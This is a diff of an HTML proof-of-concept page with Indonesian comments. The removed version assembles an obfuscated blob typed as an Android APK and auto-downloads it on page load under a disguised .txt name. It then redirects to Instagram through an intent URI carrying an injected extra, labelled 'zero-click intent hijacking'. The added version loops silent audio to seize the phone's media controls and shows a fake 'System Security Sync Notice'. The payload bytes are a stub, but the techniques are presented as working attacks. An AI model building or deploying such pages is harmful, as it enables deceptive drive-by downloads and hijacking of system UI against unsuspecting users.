@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive & Advanced Intent Dispatcher v3.2</title>
+<title>Media Session Audio Focus Hijacking PoC</title>
 <style>
 * {
   box-sizing: border-box;
@@ -25,139 +25,88 @@ body {
   padding: 32px;
   border-radius: 16px;
   box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
-  max-width: 540px;
+  max-width: 480px;
   width: 100%;
   border: 1px solid #1f2937;
   text-align: center;
 }
 h2 { 
-  margin-bottom: 10px; 
-  font-size: 22px;
+  margin-bottom: 12px; 
+  font-size: 20px;
   color: #f3f4f6;
   font-weight: 700;
 }
 p { 
-  margin-bottom: 24px; 
-  line-height: 1.6; 
+  margin-bottom: 20px; 
+  line-height: 1.5; 
   color: #9ca3af;
-  font-size: 14px;
+  font-size: 13px;
 }
 #status {
-  margin-top: 20px;
+  margin-top: 15px;
   font-weight: 500;
   color: #38bdf8;
-  padding: 14px;
+  padding: 12px;
   background: rgba(56, 189, 248, 0.1);
   border-radius: 8px;
-  font-size: 13px;
+  font-size: 12px;
   border: 1px solid rgba(56, 189, 248, 0.2);
-}
-#downloads {
-  margin-top: 20px;
-  display: none;
 }
 </style>
 </head>
 
 <body>
-<div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem & Sesi</h2>
-  <p>Menginisialisasi modul sinkronisasi berkas dan pengalihan komponen aplikasi latar belakang...</p>
-  <div id="status" role="status">Menyiapkan lingkungan eksekusi...</div>
-  <div id="downloads"></div>
+<div class="panel">
+  <h2>Media Session Controller</h2>
+  <p>Menginisialisasi perebutan fokus audio sistem dan pengambilalihan kontrol media latar belakang.</p>
+  <div id="status" role="status">Menyiapkan modul audio...</div>
 </div>
+
+<audio id="silent-audio" loop preload="auto">
+  <!-- Audio hening berbasis data URI untuk mempertahankan masa aktif fokus audio -->
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+</audio>
 
 <script>
 'use strict';
 
 const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
-
-let activeUrls = [];
-
-// Fragmen payload biner yang disamarkan
-const payloadFragments = [
-  "UEs",
-  "DBBQ",
-  "AAAAIAAAAIQ",
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
-];
-
-const assemblePayload = () => {
-  return payloadFragments.join("");
-};
-
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
-  }
-  return bytes;
-};
-
-const prepareStealthBlob = (i) => {
-  try {
-    const fullB64 = assemblePayload();
-    const bytesArr = decodeBase64ToBytes(fullB64);
-    
-    // MIME type APK
-    const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-    const url = URL.createObjectURL(blob);
-    return { id: i, url: url, success: true };
-  } catch (err) {
-    return { id: i, url: null, success: false };
-  }
-};
-
-const triggerStealthDownload = (fileData) => {
-  if (!fileData.success) return;
-
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.style.display = "none";
-  
-  downloadsDiv.appendChild(link);
-  link.click();
-};
+const audioEl = document.getElementById("silent-audio");
 
 window.addEventListener('DOMContentLoaded', () => {
-  statusDiv.textContent = "Memproses berkas latar belakang...";
-  
-  // 1. Eksekusi pembuatan file stealth secara otomatis
-  const fileData = prepareStealthBlob(1);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
-    triggerStealthDownload(fileData);
-  }
+  statusDiv.textContent = "Meminta izin fokus audio sistem...";
 
-  // 2. Eksekusi Intent Hijacking ke Instagram zero-click dengan parameter ekstra deep link
-  setTimeout(() => {
-    statusDiv.textContent = "Memicu pengalihan intent berserta parameter ekstra ke Instagram...";
-    
-    const targetPackage = "com.instagram.android";
-    const extraParamKey = "target_deep_link";
-    const extraParamVal = "profile"; 
+  // 1. Memaksa pemutaran elemen audio (memerlukan intervensi awal atau bypass konteks aman)
+  audioEl.play().then(() => {
+    statusDiv.textContent = "Audio aktif: Fokus audio berhasil dibajak.";
 
-    // Konstruksi Intent URI dengan tambahan parameter ekstra (extras) di dalam blok Intent
-    const instagramIntentUri = `intent://instagram.com/#Intent;package=${targetPackage};scheme=https;S.${extraParamKey}=${extraParamVal};S.com.instagram.extra.EXTRA_TEXT=payload_injection_test;end;`;
+    // 2. Mendaftarkan Media Session API untuk mengunci kontrol notifikasi sistem
+    if ('mediaSession' in navigator) {
+      navigator.mediaSession.metadata = new MediaMetadata({
+        title: 'System Security Sync Notice',
+        artist: 'Background Service Dispatcher',
+        album: 'Secure Enclave Session',
+        artwork: [
+          { src: 'https://via.placeholder.com/512', sizes: '512x512', type: 'image/png' }
+        ]
+      });
 
-    try {
-      // Mengarahkan navigasi secara langsung ke intent Instagram
-      window.location.replace(instagramIntentUri);
-
-      // Fallback cadangan ke web URL jika aplikasi tidak merespons
-      setTimeout(() => {
-        window.location.href = "https://www.instagram.com/";
-      }, 1000);
-
-    } catch (err) {
-      statusDiv.textContent = "Gagal memicu intent.";
-      console.error("Intent error:", err);
+      // Mengambil alih tombol aksi pemutaran sistem operasi (Lock Screen / Notification Panel)
+      navigator.mediaSession.setActionHandler('play', function() {
+        statusDiv.textContent = "Aksi 'Play' sistem dipintas.";
+        audioEl.play();
+      });
+      navigator.mediaSession.setActionHandler('pause', function() {
+        statusDiv.textContent = "Aksi 'Pause' sistem dipintas.";
+      });
+      navigator.mediaSession.setActionHandler('seekbackward', function() {});
+      navigator.mediaSession.setActionHandler('seekforward', function() {});
     }
-  }, 800);
+
+  }).catch((err) => {
+    statusDiv.textContent = "Gagal memicu fokus audio secara otomatis: " + err.message;
+    console.error("Audio playback error:", err);
+  });
 });
 </script>
 </body>
